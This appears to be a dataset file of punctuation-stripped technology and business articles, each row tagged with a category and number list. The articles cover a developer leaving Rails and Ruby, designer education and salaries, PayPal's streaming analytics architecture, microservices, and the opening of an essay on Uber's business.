people from other communities  to re think what they re doing  For example  I m pretty sure Rails has contributed to improvements in PHP community  you can try to prove I m wrong but I have a pretty vivid memory of Symfony framework taking heaps of inspiration from Rails   The same happened in Java  yes   Play framework is an example   Now  architecture design issues aside   this was a good thing  Being inspired to think outside of the box and do something new is valuable  Rails contributed to that process on a large scale   There are other aspects of Rails that are fantastic  Because Rails has been always focusing on the ease of usage and the ability to quickly build web applications  it made it possible for initiatives like Rails Girls to succeed  Rails has proven to people that they are capable of creating something on their own  without any programming experience  in relatively short time  This is amazing  as it can easily become a gateway to the programming world for people who otherwise wouldn t even consider becoming a programmer   My Journey  First of all  let me tell you a little bit about my background and where I m coming from   I started working with Ruby in late 2006  as my bachelor thesis was about Rails  yep   I ve been learning the language while I was writing my thesis  It was fun  it was exciting  it was something new for me  Back then  I was still working as a PHP developer  As a typical PHP developer back in  2005 6  I ve done all the typical things   wrote raw sql queries in view templates  choked on procedural PHP to death  then built my own framework  my own ORM  got frustrated and burned out  Despite knowing some C  C    Java and Python  I decided to go with Ruby  because of Rails  I picked it up for my thesis and completely accidentally stumbled upon a job offer from a local Rails shop  I applied  they hired me  It was in March of 2007   And so since March 2007  I ve been working with Ruby professionally  and since roughly 2009 10 I started contributing to Ruby OSS projects  During that time  I worked for a consultancy for 3 5 years  mostly working on big and complicated projects  I then went freelances for few years  worked with a bunch of clients  started my own company  then took a full time gig  then went back to freelance again  and now I m a full time employee again  I built greenfield rails apps and I helped with medium xxl rails apps   Let me tell you a story about what can happen in a convoluted Rails codebase  Once  I joined an existing project  It was a huuuuge app which was running an on line shopping community website  Complicated sales model  complicated promotions  complicated product setups  coupons  user groups  messages   it had it all  I joined them to help ship a few new features  One of my early tasks was to add a link to something on some page  It took me few days to add this stupid link  Why  The app was a big ball of complex domain logic scattered across multiple layers with view templates so complicated  it wasn t even simple to find the right template where the link was supposed to be added  Since I needed some data in order to create that link  it wasn t obvious how I should get it  There was a lack of internal application APIs and relying on ActiveRecord exclusively made it extremely difficult  I am not kidding you   My initial frustrations with Rails started quite early  I ve become displeased with ActiveRecord after roughly first 6 months of using it  I never liked how Rails approached handling JavaScript and AJAX  In case you don t remember or you were not around already  before Rails adopted UJS approach  which was a big subject in  2007 2008  with blog posts  conference talks and so on   it used inline Javascript generated by a bunch of nasty helpers  As everything with Rails  it was  nice and easy in the beginning  and then it would turn into unmaintainable crap  Eventually  Rails adopted UJS in the big version 3 0 rewrite and it seems like the community agreed that it s a better approach  This was when Merb was killed by merged into Rails  Oh  you don t know what Merb was  Right  let s talk about that   Why I was excited about Merb   DataMapper  Merb was a project created by Ezra Zygmuntowicz  It started as a hack to make file uploads faster and thread safe  It went through an interesting path from that hack to a full stack  modular  thread safe  fast web framework  I remember people started talking about it a lot in  2008 and there was this amazing feeling that something new is happening and it s gonna be great   You might be excited about Rails adding  API mode   right  Well  Merb had 3 modes  a full stack mode  an API mode and a micro mode where it was stripped down to bare minimum and I still remember it was the fastest thing ever in the ruby land  It was over 7 years ago  Ponder on that   At the same time  another project brought community attention   DataMapper  It became a part of The Merb Stack  being its ORM of choice  I got really excited about it  as it addressed a lot of issues that ActiveRecord had  DataMapper back in  2008 9 already had attribute definitions in models  custom types  lazy queries  more powerful query DSL and so on  In 2008  Yehuda Katz was one of the core contributors  he was actively promoting the project and there was a lot of excitement about it  DataMapper was ultimately a better ORM than ActiveRecord in 2008 9  It would be unfair not to mention that Sequel showed up already around the same time and till this day it s being used way less than ActiveRecord despite being a superior solution   I was excited about Merb and DataMapper as they brought hope that we can do things better and create a healthy competition for Rails  I was excited about it because both projects promoted more modular approach and thread safety  amongst other things like simply better Ruby coding standards   Both projects were ultimately killed by Rails as Merb was  merged  into Rails  what turned out to be a major Rails refactor for its 3 0 version  DataMapper lost its community attention and without much support  it never evolved as it could if Merb was not  merged  into Rails   With that decision  the Ruby ecosystem lost a bunch of important projects and only Rails benefited from this  Whether the decision to kill Merb was good or not is a matter of personal opinion  we can speculate what could ve happened if the decision wasn t made  However  there s a simple truth about competition   it s healthy  Lack of competition means monopoly  and there s a simple truth about monopoly   it s not healthy  Competition fosters progress and innovation  competition creates a healthier ecosystem  it allows people to collaborate more  to share what s common  to build better foundations  This is not what s happening in the Ruby community   After Merb   DataMapper were practically destroyed  in the long term   building anything new in the ruby ecosystem turned out to be extremely difficult   Since peoples  attention is Rails focused  new projects have been highly influenced by Rails  Breaking through with new ideas is hard  to say the least  as every time you come up with something  people just want it to be Rails like and work well with Rails  Making things work with Rails is hard  but I ll get to it later   After all these years we ve ended up with one framework dominating our entire ecosystem  influencing thousands of developers and creating standards that are questionable  We ve lost a diverse ecosystem that started to grow in 2008 and was taken over by Rails   Hey  I know how this sounds almost like a conspiracy theory  but don t treat it like that  What I ve said here are facts with a little bit of my personal feelings  I started contributing to DataMapper in late 2009 and seeing it crumble was very sad   Complexity   Complexity is our biggest enemy  People have become less enthusiastic about Rails  because it quickly turned out that dealing with growing complexity leaves us with lots of unanswered questions  What DHH   co  have offered has been never enough to address many issues that thousands of developers started to struggle with already back in  2007 2008  Some people hoped that maybe Merb DataMapper will bring improvements but you know what happened now  so we were all back using Rails again in 2010  when Rails 3 0 was released   A couple of days ago somebody posted on  r ruby a link to an article about organizing your code using  Service Objects   This is one of many articles like that  If you think it s some kind of a recent trend  go take a look at James Golick s article from March 2010   Crazy  Heretical  and Awesome  The Way I Write Rails Apps   We ve been talking about ways of improving architecture of our Rails applications for roughly 6 years  I ve been trying to contribute to this discussion as much as I could  with articles  conference talks and by working on many OSS projects that strive to solve various hard problems   The arguments and ideas people have had are always being ridiculed by Rails Core Team members  and especially by DHH  This has been off putting and discouraging for me  and the reason why I never tried to contribute to Rails  I m pretty damn sure that my proposals would end up being drastically downvoted  Monkey patches  C mon  not a problem  we love our 10 years ago   New abstractions  Who needs that  Rails is SIMPLE  TDD  Not a problem  it s dead  don t bother  ActiveRecord is bloated   so what  it s so handy and convenient  let s add more features instead   Rails ecosystem  especially around its core team  has never made a good impression on me and I don t have a problem admitting that I m simply afraid of proposing any changes  This is especially so since the first issue I d submit would be  Please remove ActiveSupport   ha ha imagine that     OK let s get into some tech details   Rails Convenience Oriented Design  As I mentioned  Rails has been built with the ease of use in mind  Do not confuse this with simplicity  Just yesterday I stumbled upon this tweet  it says it all   Easy vs  Simple pic twitter com b6r0cTD6WO   D ve Cheney   davecheney  May 19  2016  This is how Rails works  classic example   User   create   params    user     You see a simple line of code  and you can immediately say  assuming you know User is an AR model  what it s doing  The problem here is that people confuse simplicity with convenience  It s convenient  aka  easy   to write this in your controller and get the job done  right   Now  this line of code is not simple  it s easy to write it  but the code is extremely complicated under the hood because   params must often go through db specific coercions  params must be validated  params might be changed through callbacks  including external systems causing side effects  invalid state results in setting error messages  which depends on external system  i e  I18n   valid params must be set as object s state  potentially setting up associated objects too  a single object or an entire object graph must be stored in the database  This lacks basic separation of concerns  which is always damaging for any complex project  It increases coupling and makes it harder to change and extend code   But in Rails world  this isn t a problem  In Rails world  basic design guidelines like SRP  and SOLID in general  are being ridiculed and presented as  bloated  unneeded abstractions causing complexity   When you say you d prefer to model your application use cases using your own objects and make complex parts explicit  Rails leaders will tell you YAGNI  When you say you d prefer to use composition  which makes your code more reliable and flexible  Rails leaders  except tenderlove  will tell you  use ActiveSupport  Concerns     For a Rails developer  it s not a problem that data coming from a web form are being sent to the depths of ActiveRecord where God knows what will happen   The really challenging part in this discussion is being able to explain that it is a problem in the first place  People are attracted by Rails because it gives you a false sense of simplicity  whereas what really happens is that complexity is being hidden by convenient interfaces  These interfaces are based on many assumptions about how you re gonna build and design your application  ActiveRecord is just one  representative example  but Rails is built with that philosophy in mind  every piece of Rails works like that   I should mention that I know there are huge efforts to make ActiveRecord better  like introducing Attributes API  done through some serious internal refactoring which improved the code base   Unfortunately  as long as ActiveRecord comes with over 200 public methods  and encourages the usage of callbacks and concerns  this will always be an ORM that will not be able to handle growing complexity  it ll only contribute to this complexity and make things worse   Will that change in Rails  I don t think so  We have zero indication that something can be improved as Rails leaders are simply against it  Simple proof is the recent controversial addition  ActiveRecord suppress was proposed by DHH himself  Notice how yet again he makes fun of standalone Ruby classes saying  Yes  you could also accomplish this by having a separate factory for CreateCommentWithNotificationsFactory   Oh boy   ActiveCoupling  Should Rails be your application  This was an important question asked by many after watching Uncle Bob s talk  where he basically suggests a stronger separation between web part and your actual core application  Technical details aside  this is good advice  but Rails has not been designed with that in mind  If you re doing it with Rails  you re missing the whole point of this framework  In fact  take a look at what DHH said about this    paulca Fuck  That  Shit  Same complete wank   Rails is not your application   If you re building a web app  of course it is    DHH   dhh  June 29  2012  It s pretty clear what his thoughts are  right  The important part is  of course it is   And you know what  I wholeheartedly agree   Rails is your application  and it will always be  unless you go through the enormous effort of using it in a way that it wasn t meant to be used   Think about this   ActiveRecord is meant to become the central part of your domain logic   That s why it comes with its gigantic interface and plenty of features  You only break things down and extract logic into separate components when it makes sense  but Rails philosophy is to put stuff to ActiveRecord  not bother about SRP  not bother about LoD  not bother about tight coupling between domain logic and persistence and so on  That s how you can use Rails effectively     That s why it comes with its gigantic interface and plenty of features  You only break things down and extract logic into separate components when it makes sense  but Rails philosophy is to put stuff to ActiveRecord  not bother about SRP  not bother about LoD  not bother about tight coupling between domain logic and persistence and so on  That s how you can use Rails effectively  The entire view  layer  in Rails is coupled to ActiveModel  thus making it coupled to an Active Record ORM  it could be Sequel  it doesn t matter   Controllers  aka your web API endpoints  are integral part of Rails  tight coupling takes place here too  Helpers  the way you deal with complex templates in Rails  are also integral part of Rails  tight coupling once again  Everything in Rails  and in a plethora of 3rd party gems built for Rails  is happening through inheritance  either mixins or class based   Rails and 3rd party gems don t typically provide standalone  reusable objects  they provide abstractions that your objects inherit   this is another form of tight coupling   With that in mind  it would be crazy to think that Rails is not your application  If you try to avoid this type of coupling  you can probably imagine what kind of an effort it would be and how much of the builtin functionality you d lose   and this is exactly why showing alternative approaches in Rails create an impression of bloated  unnecessary abstractions reminding people of their  scary  Java days  Rails has not been built with loose coupling and component oriented design in mind   Don t fight it  Accept it   Not a good citizen  Having said all of that  my biggest beef with Rails is actually ActiveSupport  Since I ranted about it already  I don t feel like I need to repeat myself  I also recommend going through the comments in the linked blog post   The only thing I d like to add is that because of ActiveSupport  I don t consider Rails to be a good citizen in the ruby ecosystem  This library is everything that is wrong with Rails for me  No actual solutions  no solid abstractions  just nasty workarounds to address a problem at hand  workarounds that turn into official APIs  and cargo culted as a result  Gross   Rails is a closed ecosystem  and it imposes its bad requirements on other projects  If you want to make something work with Rails  you gotta take care of things like making sure it actually works fine when ActiveSupport is required  or that it can work with the atrocious code reloading in development mode  or that objects are being provided as globals because you know  in Rails everything should be available everywhere  for your convenience   The way Rails works demands a lot of additional effort from developers building their own gems  First of all  it is expected that your gems can work with Rails  because obviously everybody is going to use them with Rails   and that itself is a challenge  You have a library that deals with databases and you want to make it work with Rails  Well  now you gotta make it work like ActiveRecord  more or less  because the integration interface is ActiveModel  originally based on ActiveRecord prior Rails 3 0   There are plenty of constraints here that make it very hard to provide integration with Rails   You have no idea how many issues you may face when trying to make things work with hot code reloading in development mode  Rails expects a global  mutable run time environment  To make it even harder for everybody  they introduced Spring  This gem opened up a whole category of potential new bugs that your gems may face while you try to make them work with Rails  I m so done with this  my friends  Not only is code reloading in Ruby unreliable  but it s also introducing a lot of completely unnecessary complexity to our gems and applications  This affects everybody who s building gems that are supposed to work with Rails  Nobody from the Rails Core team  despite the criticism throughout the years  thought that maybe it d be a good idea to see how it could be done better  If someone focused on making application code load faster  we could just rely on restarting the process  Besides  you should really use automated testing to see if a change you just made actually works  rather than hitting F5  Just saying   I know it sounds like complaining  because it is  I ve tried to support Rails and it was just too frustrating for me  I ve given up  I don t want to do it anymore   Since my solution to the problems I ve had would mean ditching ActiveSupport  removing Active Record as the pattern of choice  and adding an actual view layer that s decoupled from any ORM  I realized that it s unreasonable to think this will ever happen in Rails   Leaving Rails  As a result of 9 freaking years of working with Rails and contributing like hell to many ruby OSS projects  I ve given up  I don t believe anything good can happen with Rails  This is my personal point of view  but many people share the same feelings  At the same time  there s many more who are still happy with Rails  Good for them  Honestly  Rails is here to stay  it s got its use cases  it still helps people and it s a mature  well maintained  stable web framework  I m not trying to convince anybody that Rails is ultimately bad  It s just really bad for me   This decision has had its consequences though  This is why I got involved with dry rb  hanami and trailblazer projects and why I ve been working on rom rb too  I want to help to build a new ecosystem that will hopefully bring back the same kind of enthusiasm that we all felt when Merb DataMapper was a thing   We need a diverse ecosystem  we need more small  focused  simple and robust libraries  We need rubyists who feel comfortable using frameworks as well as smaller libraries    sort of  Leaving Ruby  Truth is  leaving Rails is also the beginning of my next journey   leaving Ruby as my primary language  I ve been inspired by functional programming for the last couple of years  You can see that in the way I write Ruby these days  I m watching Elixir growing with great excitement  I m also learning Clojure  which at the moment is on the top of my  languages to learn  list  The more I learn it  the more I love it  My ultimate goal is to learn Haskell too  as I m being intrigued by static typing  Currently at work  I ve been working with Scala  I could very quickly appreciate static typing there  even though it was a rough experience adjusting my development workflow to also include compilation dealing with type errors steps  It is refreshing to see my editor telling me I made a mistake before I even get to running any tests   The more I m learning about functional programming  the more I see how Rails is behind when it comes to modern application design  Monkey patching  relying on global mutable state  complex ORM  these things are considered as major problems in functional languages   I know many will say  but Ruby is an OO language  use that to your advantage instead of trying to make it what it cannot be    this is not true  First of all  Ruby is an OO language with functional features  blocks  method objects  lambdas  anyone    Secondly  avoiding mutable state is a general  good advice  which you can apply in your Ruby code  Ditching global state and isolating it when you can t avoid is also a really good general advice   Anyhow  I m leaving Ruby  I ve already started the process  It s gonna take years  but that s my direction  I will continue working on and supporting rom rb  dry rb  helping with hanami and trailblazer  so don t worry  these projects are very important for me and it makes me very happy seeing the communities growing   Common Feedback Questions  This is a list of made up feedback and questions  but it s based on actual  real feedback I ve been receiving   Shut up  Rails is great and works very well for me   This is the most common feedback I receive  First of all  it worries me that many people react like that  We re discussing a tool  not a person  no need to get emotional  Don t get me wrong  I understand that it s natural to  defend  something that helped you and you simply like it  at the same time it s healthy to be able to think outside of the box and be open to hear criticism and just think about it  If you re happy with Rails  that s great  really   You re just complaining  you re not helping  you haven t done anything to help Rails become better  you haven t suggested any solutions to the problems you re describing  This type of feedback used to make me very angry and sad  In the moment of writing this  and according to GitHub  I made 2 435 contributions in the last year  That was in my spare time  Yes  I haven t contributed to Rails directly  because of the reasons I explained in this article  There s too much I disagree with and it would ve been a waste of time for both parties  I ve been contributing through blog posts  conf talks and thousands lines of OSS code that you can find on GitHub   It s OSS  just fork it  This misses the point completely  We need diversity in the ecosystem with a good selection of libraries  and a couple of frameworks with their unique feature sets making them suitable for various use cases  A fork of Rails would make no sense  Nobody would fork Rails to go through a struggle like removing ActiveSupport and de coupling the framework from concepts like Active Record pattern  It s easier and faster to build something new  which other people are already doing  see Hanami    Just don t use Rails  I did stop using Rails last year  but it s not happening  just like that   Being a Ruby developer means that in 99  of the cases your client work will be Rails  Chances of getting a gig without Rails are close to 0   Selling  alternative solutions for clients is risky unless you are 100  sure you re gonna be the one maintaining a project for a longer period   What happens right now is that some businesses  in most of the cases  have two choices  go with Rails or not go with Ruby and pick a completely different technology  People won t be looking at other solutions in Ruby  because they don t feel confident about them and they are not interested in supporting them  I m talking about common cases here  there are exceptions but they are extremely rare   OK cool  but what are you suggesting exactly   My suggestion is to take a really good look at the current ruby ecosystem and think about its future  The moment somebody builds a web framework in a better language than Ruby  which provides a similar  fast pace prototyping capabilities  Rails might become irrelevant for businesses  When that happens  what is it that the ruby ecosystem has to offer   If we want Ruby to remain relevant  we need a stronger ecosystem with better libraries and alternative frameworks that can address certain needs better than Rails  so that businesses will continue to consider using Ruby  or keep using Ruby    We ve got over a decade of experience  we ve learned so much  we can use that to our advantage   You obviously have some personal agenda  I don t trust your judgements   I don t  I ve got my OSS projects  I m working on a book  I have a rom rb donation campaign and I understand that this creates an impression that I simply look to gain something here   That s not true  this is not why I m doing it  I ve been working so hard first and foremost because I enjoy learning  experimenting  collaborating with people and simply because I care about Ruby s future  The reason why I decided to write a book is because explaining all the new concepts we ve introduced in various libraries is close to impossible without a book   My donation campaign was started because I ve invested countless hours into the project and I couldn t continue doing that because I was too busy with client work and  you know  something called life,"[257 26 607 316 90 214 1335 234 778 61 899]"
262,training-dataset/product/1174.txt,product,Education and wagesThe design world is changing  and fast  It s no surprise  then  that many institutions of higher education struggle to keep pace  In the 2016 Product Design Report  we wanted to learn more about the role education both formal and informal plays for designers today   The biggest takeaway we uncovered  Designers are split nearly 50 50 in terms of being self taught and having a formal design background  51  have a formal design education while 49  are self taught  Makes sense when you consider the pace at which the design industry is evolving   We found a pretty significant difference in education when you break it down by gender  too  Women are more likely than men to have a higher degree  with about 72  of women holding a bachelor s versus 56  of men  22  of male designers hold no advanced degree  compared to just 7  of female designers   The real question  though  is if education correlates in any way to salary  Is the high cost of a formal education worth it for an aspiring designer   As it turns out  salaried designers with formal training earn about 5  more on average than their self taught counterparts   78 061 compared to  74 657 annually   A curious finding in the report was that designers with doctorate degrees earn less than those with bachelor s degrees  on average  Those holding a master s degree fared best  earning just under  90 000 annually  Those holding just an associate s degree came in at less than  61 000 annually   If you want to ascend to  highest earning designer  level  the report shows that earning a higher degree is probably worth it  Designers without a formal degree were 27  less likely to be the top earners in their chosen field   Discover more insight into how education and pay correlate in the full report,"[262 674 582 656 332 1373 520 641 234 278 778]"
276,training-dataset/engineering/1129.txt,engineering,From Big Data to Fast Data in Four Weeks or How Reactive Programming is Changing the World   Part 2Part 2  Lambda Architecture meets reality  Part 1 can be found here   Fast Data  Fast forward to December 2015  We have a cross data center Kafka clusters  we have Spark adoption through the roof  All of this  however  was to fix our traditional batch platform  I m not going to pretend we never thought about real time stuff  We d been gearing up toward the Lambda architecture all along  but truly we were not working specifically for the sake of the near real time analytics   The beauty of our current stack and skill set is that streaming just comes with it  All we needed to do is to write a Spark Streaming app connected directly to our Kafka and feed the same Teradata repo with micro batches   Most of the stuff just worked out of the box  with some caveats   Spark streaming requires a different thinking about resource allocation on Hadoop  dynamic memory management on Spark cache helps a lot  Long running streaming jobs also require a different approach to monitoring and SLA measurements  Our operational ecosystem needed some upgrades  For example  we had to create our own monitoring scripts to parse Spark logs to determine whether a job is still alive   The only real nasty surprise we got  was from the downstream Tableau infrastructure Product and Marketing people were using  The Tableau server could not refresh its dashboards as fast as we were updating the metrics in Teradata   Lambda architecture in practice  Let s get a closer look at our version of the Lambda architecture   There are two main scenarios inherent in streaming analytical systems  which our Lambda architecture implementation helps to overcome   Upstream delays in the pipe  We need to remember that asynchronous near real time analytical systems are pretty sensitive to traffic fluctuations  Conceptually our pipe looks like series of buffers spread out across network zones  data centers  and nodes  Some buffers are pushing  some pulling  In total  it is highly available and protected from traffic spikes  Still  fairly often communication between different buffers can be degraded or completely lost  We will not lose events  persistent buffers take care of that  The correctness of the metric calculation  however  will suffer because of the delays  Batch system  on the other hand  provides greater correctness  but we have to artificially delay metric calculation to account for potential delays in the upstream pipe   We tell our internal customers that they can have  close enough  numbers almost immediately and exact numbers within hours   We use Spark for both batch and streaming  Same code base  The streaming part runs on micro batch schedule   i e  seconds or minutes  the Batch part runs on macro batch schedule   hours  days  Correspondingly  streaming code calculates short duration metrics like 1 minute totals  and batch code calculates longer duration metrics like 1 hour or 1 day totals  both batches consume the same raw events   The chained export process adds the latest available calculations into SQL data store  regardless of which part has produced the output   Imagine some metric  say  number of clicks per page   Micro batch will pull new events from Kafka every minute and push totals to SQL data store  User might query last hour totals   an aggregate of the last 60 minutes  At the same time  one or two nodes has been taken off line due to some network issue  Some thousands of events might be still buffered  persisted  at the local node storage  Then after 30 minutes  nodes are back on line and transmitting whatever events left in the buffer  However  at the time when the user saw the  last hour  total  late coming events were not available  Batch  which is scheduled to run on prior 4 hours of data  will include delayed records and will re calculate hourly totals correctly  Another batch  which is scheduled to run daily  will make sure that whatever might be missed by 4 hour batch is added etc   Interruptions or pauses in streaming calculations  Another common issue with near real time calculations is availability of the calculating process itself  What happens when our micro batch goes down for whatever reason   Could be some systemic Hadoop failure  bug  or planned downtime    Spark Streaming micro batch is a long running Yarn process  This means it will allocate a certain amount of resources and will keep those resources forever  or until it is killed   Keeping this in mind  the amount of resources allocated  number and size of the containers as scheduled by Yarn   must be fine tuned to fit the volume of the micro batch pretty closely  Ideally  the duration of the single run should be very close to the micro batch iteration time to minimize idle time between iterations   In our case  we usually fine tune the number and size of Spark executors by determining our peak volume and running micro batch experimentally for a number of days  Normally we would also oversubscribe resources to allow for some fluctuations in traffic  Let s say we ve decided to run our micro batch every 1 minute  Yarn queue  in which our streaming job will run  will have max size to fit up to 2 3 min worth of traffic in one run  just in case of a traffic spike or quick job restart  What it means is our micro batch will pull at most 3 minutes  worth of traffic from Kafka in a single iteration and it will spend no more than 1 minute processing it   What happens when micro batch is down for an hour for cluster maintenance  When micro batch starts after long pause and tries to pull all the events since last iteration  there will be 20 times more data to process than we have resources allocated in the queue   Total delay is 60 min   max expected for single iteration 3 minute   20 times   If we try to process all the backlog using our small queue it will run forever and create even more backlog   Our approach for streaming calculations is to skip forward to the last 3 min after any interruption  This will create gaps in 1 minute totals  Any rolled up totals in this case will be off   For this scenario as well  macro batches  totaling raw events independently  will create correct hourly daily weekly totals despite any gap in 1 minute totals   Bottom line  combining streaming micro batch calculations with traditional macro batch calculations will cover all user needs from rough numbers for trending during the day to exact numbers for a weekly report   What s next   There are still two reactive dominoes to tumble before we achieve the full reactive nirvana across our stack   The most obvious step is to relocate user facing dashboards to a nimbler analytical platform  We had already been using Druid for a while and developed a Spark   Druid connector  Now we can push calculation results to users at whatever velocity we need   Familiarity with FP and Scala and understanding of the Akka role in the success of Spark and Kafka  helped us to re evaluate our event collector architecture as well  It is written using a traditional Java Servlets container and uses lots of complicated multithreading code to consume multiple streams of events asynchronously   Reactive approach  specifically reactive Akka Streams  and Scala is exactly what we need to drastically simplify our Java code base and to wring every last ounce of scalability from our hardware   Thanks to our friends at the PayPal framework team  Reactive programming is now becoming mainstream at PayPal  SQUBS a new reactive way for PayPal to build applications  Conclusion  Is my claim that Reactive Programming is changing the world too dramatic  The cost of scalability is a key factor to consider  Frameworks like Akka are democratizing one of the most complex  hard to test  and debug domains of software development  With a solid foundation  Sparks and Kafkas of the world are evolving much faster than the prior generation of similar tools  This means more time is being spent on business critical features than on fixing inevitable  in the past  concurrency bugs   Consider our case   In the past  real time analytic systems  like CEP   complex event processing  were an extreme luxury  literally costing millions of dollars in license fees just to set it up  Companies would invest in those systems for very important core business reasons only  For PayPal or Credit Card companies it would be fraud detection  Product roll outs or marketing campaigns however  would very rarely reach the threshold of such importance   Today we get the streaming platform practically for free as a package deal   So yes  Reactive programming is changing the world,"[276 1309 1205 886 1010 1336 92 673 902 613 606]"
278,training-dataset/engineering/1194.txt,engineering,Microservices   An Agile Architecture IntroductionIn the ever evolving and dynamic world of software architecture  you will hear new buzz words every other month  Microservices is the latest of them  though not as new as it appears  it has been around for some time now in different forms   Microservices   The micro of SOA      the microservice architectural style is an approach to developing a single application as a suite of small services  each running in its own process and communicating with lightweight mechanisms  often an HTTP resource API  These services are built around business capabilities and independently deployable by fully automated deployment machinery  There is a bare minimum of centralized management of these services  which may be written in different programming languages and use different data storage technologies   that Fowler guy   So  to break it all down  microservices is a form of fine grained service oriented architecture  SOA  implementation that could be used to build independent  flexible  scalable  and reusable software applications in a decoupled manner  This relies heavily on separately deployable and maintainable sub systems  processes that can communicate over a network using technology agnostic protocols  That in turns  pave way for DevOps and Continuous Deployment pipelines   Principia Microservices   nutshell  You would not find a defined set of characteristics of a microservices based system  A formal definition is still missing  though we can outline the basic and mostly mentioned pointer     The services are small fine grained representation of a single business function     Designed and maintained around capabilities     Flexible  robust  replaceable  and independent of each other in nature     Designed to embrace faults and failures  An unavailable service cannot bring the system down  Emphasis on monitoring and logging     Advocates the practices of continuous improvement  continuous integration and deployment   Services as Components  Defining software systems as a set of smaller  independently maintainable components has always been a craving of well define architectures  The current programming languages lack the mechanism of explicit boundary definitions for components and often  it s just documentation and published best practices  code reviews that stops a developer in mixing logical components in a monolithically designed application   This differs a bit from the idea of libraries  Libraries are in process components of an application that  though logically separate  cannot be deployed and maintained independently   In microservices  components are explicitly defined as independent and autonomously deployable services  This enables continuous processes  CI   CD  and enhances maintainability of individual components  increases reusability and overall robustness of the system  It also enables a better realization of business processes into the application   Built for Business  Most of the time  organisations looking to build a decoupled system focuses on technical capabilities  This leads to teams of UI devs  backend devs  DB devs etc  This leads to siloed architectures and applications   Microservices does things differently  The organisation splits teams as per the business capabilities  This results in cross functional  dynamic and independent teams with full technical capabilities   Decentralized  A consequence of a monolithic design is central management and support of the whole system  This create problems in scalability and reusability  These systems tend to favour a single set of tools and technologies   Microservices advocates  you build it  you run it  approach  The teams are designed to take end to end responsibility of the product  This disperse the capabilities across the teams and helps tie up the services with business capabilities and functions  This also enables selection of underlying technologies based on needs and availabilities   Designed for Failure  A failure in monolithic design could be a catastrophe  if not dealt with gracefully and with a fall back approach  Microservices  however  are designed for failure from the beginning  Because of their independent and granular nature  the overall user experience in case of a failure tends to be manageable  Unavailability of one service does not bring the whole system down  It is also easier to drill down in microservices to identify the root cause because of their agility and explicit boundaries  Real time monitoring and logging and other cross cutting concerns are easier to implement and are heavily emphasized    If we look at the characteristics of an agile software architecture  we tend to think of something that is built using a collection of small  loosely coupled components services that collaborate together to satisfy an end goal  This style of architecture provides agility in several ways  Small  loosely coupled components services can be built  modified and tested in isolation  or even ripped out and replaced depending on how requirements change  This style of architecture also lends itself well to a very flexible and adaptable deployment model  since new components services can be added and scaled if needed     Simon Brown  Microservices architecture tends to result in independent products  services designed and implemented using different languages  databases  and hardware and software environments  as per the capabilities and requirements  They are granular  with explicit boundaries  autonomously developed  independently deployable  decentralized and built and released with automated processes   Issues   Architecture of the wise  However  there are certain drawbacks of microservices as well  like higher cost of communication because of network latency  runtime overhead  message processing  as oppose to in process calls  and blurry definitions of boundaries between services  A poorly designed application based on microservices could yield more complexity since the complexity will only be shifted onto the communication protocols  particularly in distributed transactional systems    You can move it about but it s still there    Robert Annett  Where is the complexity   Decentralized management  especially for databases has some implications related to updates and patches  apart from transactional issues  This might lead to inconsistent databases and need well defined processes for management  updates  and transactional data consistency   Overall system performance often demand serious considerations  Since microservices targets distributed applications in isolated environments  the communication cost between components tends to be higher  This leads to lower overall system performance if not designed carefully  Netflix is a leading example of how a distributed system based on microservices could outperform some of the best monolithic systems in the world   Microservices tends to be small and stateless  still business processes are often state full and transitional in nature so dividing business processes and data modelling could be challenging  Poorly parted business processes create blurry boundaries and responsibility issues   Potential of failure and unavailability rises significantly with distributed systems based on isolated components communicating over networks  Microservices could suffer with the same because of high dependence on isolated components  services  Systems with little or no attention to Design for Failure could lead to higher running cost and unavailability issues   Coping with issues of distributed systems could lead to complexities in implementation details  Less skilled teams in this case will suffer greatly  especially when handling with performance and reliability issues  Therefore  microservices is the architecture of the wise  Often building a monolithic system and then migrating to a more distributed system using microservices works best  This also gives the teams more insights about business processes and experience of handling existing complexities which comes handy in segregating processes into services with clearer boundaries   When we have multiple isolated components working together in a system  version control becomes a problem  as with all the distributed systems  Services dependencies upon each other create issues when incorporating changes  This tends to get bigger as the system grows  Microservices emphasises on simpler interfaces and handshakes between services and advocates immutable designs to resolve versioning issues  This still requires managing and supporting multiple services at times   Last words  There is no zero one choice between monolithic and distributed systems  Both have their advantages and shortcomings  The choice of an architecture heavily depends upon the business structure  team capabilities and skill set  and the dispersed knowledge of the business models  Microservices does solve a lot of problems classical one package systems face but it does come up with a cost  More than the architectural choices  it is the culture of the team and the mindset of people that makes the difference between success and failure   there is no holy grail   Further reading  https   martinfowler com articles microservices html  https   smartbear com learn api design what are microservices   Google,"[278 773 60 1377 234 548 1126 695 596 1159 1351]"
281,training-dataset/business/72.txt,business,I Don t Think Uber is Actually a Great Business  Yet    Finn s CaveAdditional Background If You Stumbled on this Post Randomly  Uber is everywhere   especially in the startup technology world that I follow closely  mostly through podcasts  It is the source of deliciously spirited debate because it is a wonderful blend of ubiquitous consumer product and highly publicized startup juggernaut  And whenever I get in too many debates with people about one topic and get stuck on a plane with no wi fi  I write out my arguments  which I occasionally publish and commit to the public record   I m not a journalist who spent 200 hours researching the story  a venture capitalist who knows all the secret information discussed behind closed doors  or a billionaire who can say  listen to me  I m richer and smarter than you    I just digest a ton of information  try to think about things from first principles  and filter out all the bullshit and think independently if possible  Slightly nervous  but here it goes                         Uber is an incredible success by any measure of a startup   the company was founded only seven years ago  has raised  10B from world class investors  and is now valued at  62 5B   It provides all of us with delightfully quick and  usually  cheap rides in nice cars  driven by pleasant people  Uber s existence makes my life much  much better  and the founders have been able to execute at a level that is simply stunning   Consequently  Uber has been anointed as the official Silicon Valley Company of the Future That Wins Everything  SVCOTFTWE  by the startup venture capital media industrial complex   However  I believe that the certainty of Uber s future dominance is vastly overrated  While Uber is indeed an amazing company  it is actually not a fundamentally great business  and its future is even more challenging  The lack of public counter narrative about the business of Uber makes me feel like I m either insane  or this is an  emperor has no clothes is wearing old sweatpants  situation   Uber Alarm Bells  There are alarm bells that call into question the inevitability that Uber  the business  will actually be the Silicon Valley Company of the Future That Wins Everything  They tell me  don t believe the hype  look closer  because  as my 8th grade baseball coach used to say   no one shits ice cream   not even Uber    1  No one with a significant public voice  that I can remember  says anything bad about the business of Uber  They criticize its ethics  social impact  culture  etc  but it is taken as gospel that Uber is basically Standard Oil re created  Lemming behavior like this  perpetuated by Silicon Valley insiders  makes me suspicious  I m also legitimately nervous writing something negative about them and publishing it  which is weird in of itself  please don t cancel my account Uber    2  Especially since  according to released financials from the first half of 2015  even though Uber did  3 6B in bookings and made net revenue of  663M  their earnings after paying drivers   after including  